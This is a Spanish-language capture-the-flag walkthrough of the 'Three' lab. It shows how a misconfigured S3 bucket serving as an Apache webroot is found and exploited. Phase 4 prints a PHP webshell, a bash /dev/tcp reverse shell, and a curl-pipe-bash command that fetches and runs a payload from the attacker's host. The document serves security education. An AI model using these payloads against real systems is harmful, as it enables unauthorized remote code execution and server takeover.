# Análisis y Explotación del Laboratorio "Three"

## Resumen del Escenario

Este documento detalla el proceso de pentesting realizado en el laboratorio "Three". El escenario se centra en una máquina Linux que utiliza un bucket de AWS S3 mal configurado como almacenamiento para un sitio web Apache. La explotación se basa en abusar de los permisos de escritura de dicho bucket para subir una webshell, obtener ejecución remota de comandos y, finalmente, establecer una shell inversa para comprometer el sistema.

---

## Fase 1: Reconocimiento y Enumeración Inicial

El primer paso en cualquier prueba de penetración es identificar los puntos de entrada disponibles. Para ello, se realiza un escaneo de puertos utilizando Nmap.

### 1.1 Escaneo de Puertos con Nmap

Se utiliza Nmap para escanear la máquina objetivo e identificar puertos abiertos, así como los servicios y versiones que se ejecutan en ellos.

**Comando:**
```bash
sudo nmap -sV 10.129.227.248
```

**Resultados:**
El escaneo revela dos puertos abiertos de interés:
* **22/tcp (SSH):** OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
* **80/tcp (HTTP):** Apache httpd 2.4.29

El servicio HTTP en el puerto 80 es el vector de ataque más prometedor.

---

## Fase 2: Enumeración Web y de Dominio

Con un servidor web identificado, el siguiente paso es investigar la aplicación web y buscar información útil.

### 2.1 Análisis del Sitio Web

Al acceder al sitio en el puerto 80, se encuentra una página estática. La inspección del código fuente revela dos pistas importantes:
* Un formulario de contacto que envía datos a `/action_page.php`, lo que confirma que el backend utiliza **PHP**.
* Una dirección de correo electrónico, `mail@thetoppers.htb`, que nos proporciona un nombre de dominio: **thetoppers.htb**.

### 2.2 Configuración del Archivo `/etc/hosts`

Para que nuestro sistema pueda resolver el dominio `thetoppers.htb`, es necesario añadir una entrada en el archivo `/etc/hosts`.

**Comando:**
```bash
echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
```

### 2.3 Enumeración de Subdominios (Virtual Hosts)

Se utiliza la herramienta `gobuster` para buscar subdominios asociados al dominio principal. Esto se hace mediante un ataque de fuerza bruta de "virtual hosts".

**Comando:**
```bash
gobuster vhost -w /usr/share/wordlists/seclists/subdomains-top1million-5000.txt -u [http://thetoppers.htb](http://thetoppers.htb)
```

**Resultado:**
`gobuster` encuentra un subdominio: `s3.thetoppers.htb`. Este nombre sugiere fuertemente una relación con el servicio de almacenamiento S3 de AWS.

Se añade este nuevo subdominio al archivo `/etc/hosts`:
```bash
echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

---

## Fase 3: Interacción y Análisis del S3 Bucket

El descubrimiento del subdominio `s3` nos lleva a investigar la posible existencia de un bucket de almacenamiento mal configurado.

### 3.1 Configuración de `awscli`

Para interactuar con servicios de AWS, se utiliza la herramienta `awscli`. Se configura con credenciales arbitrarias, ya que algunas configuraciones inseguras no validan la autenticación.

**Comando de configuración:**
```bash
aws configure
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

### 3.2 Listado del Contenido del Bucket

Se utiliza `awscli` para listar el contenido del bucket. Es crucial especificar el endpoint para apuntar a nuestro objetivo en lugar de a los servidores reales de AWS.

**Comando para listar buckets:**
```bash
aws --endpoint=[http://s3.thetoppers.htb](http://s3.thetoppers.htb) s3 ls
```

**Comando para listar objetos dentro del bucket:**
```bash
aws --endpoint=[http://s3.thetoppers.htb](http://s3.thetoppers.htb) s3 ls s3://thetoppers.htb
```

**Resultado:**
Se listan los archivos `index.php` y `.htaccess`, y el directorio `images/`. Esto confirma que el bucket contiene los archivos del sitio web y que el servidor Apache lo está utilizando como su directorio raíz.

---

## Fase 4: Explotación y Obtención de Acceso

El hecho de que podamos listar el contenido y que el bucket sirva como webroot nos lleva a probar si también tenemos permisos de escritura.

### 4.1 Creación y Subida de la Webshell

Se crea una webshell simple en PHP que ejecuta comandos pasados a través de un parámetro GET en la URL.

**Payload de la Webshell:**
```php
<?php system($_GET["cmd"]); ?>
```

**Comandos para crear y subir la webshell:**
```bash
# Crear el archivo shell.php con el payload
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Subir el archivo al bucket S3
aws --endpoint=[http://s3.thetoppers.htb](http://s3.thetoppers.htb) s3 cp shell.php s3://thetoppers.htb
```

### 4.2 Verificación de Ejecución Remota de Comandos (RCE)

Se accede a la webshell a través del navegador para confirmar que tenemos ejecución de comandos en el servidor.

**URL de prueba:**
`http://thetoppers.htb/shell.php?cmd=id`

La respuesta del servidor (`uid=33(www-data)...`) confirma el RCE exitoso.

### 4.3 Escalada a Shell Inversa

Una webshell es limitada. El objetivo final es obtener una shell interactiva y estable.

**Paso 1: Iniciar un oyente en la máquina atacante**
Se utiliza `netcat` para abrir un puerto y esperar la conexión entrante.
```bash
nc -nvlp 1337
```

**Paso 2: Crear el payload de la shell inversa**
Se crea un script `shell.sh` en la máquina atacante que iniciará la conexión de vuelta.
```bash
#!/bin/bash
bash -i >& /dev/tcp/<TU_DIRECCION_IP>/1337 0>&1
```

**Paso 3: Levantar un servidor web para alojar el payload**
Desde el directorio que contiene `shell.sh`, se inicia un servidor web simple con Python.
```bash
python3 -m http.server 8000
```

**Paso 4: Activar el payload desde la webshell**
Se usa la webshell para que la máquina víctima descargue y ejecute el script `shell.sh`.
`http://thetoppers.htb/shell.php?cmd=curl%20<TU_DIRECCION_IP>:8000/shell.sh%20|%20bash`

Al ejecutar este comando, se recibe una conexión en el oyente de netcat, proporcionando una shell interactiva en la máquina víctima.

---

## Fase 5: Post-Explotación y Captura de la Bandera

Con una shell en el sistema, el paso final es encontrar la bandera.

**Comando:**
```bash
cat /var/www/flag.txt
```

---

## Conceptos Teóricos Clave

* **AWS S3 Buckets:** Son contenedores de almacenamiento en la nube de Amazon. Su seguridad depende enteramente de la correcta configuración de permisos. Una mala configuración puede exponer los archivos al público o, como en este caso, permitir la escritura no autorizada, lo que representa un grave riesgo de seguridad.
* **Webshell:** Es un script malicioso (comúnmente en PHP, ASP, etc.) que se sube a un servidor web para obtener ejecución remota de comandos. Funciona como una puerta trasera, permitiendo al atacante controlar el servidor a través del navegador.
* **Shell Inversa (Reverse Shell):** Es una técnica en la que la máquina víctima inicia una conexión de vuelta hacia el atacante. Esto es extremadamente útil para evadir firewalls, que a menudo bloquean conexiones entrantes pero permiten las salientes. Proporciona una sesión de terminal interactiva y estable, superior a una webshell.
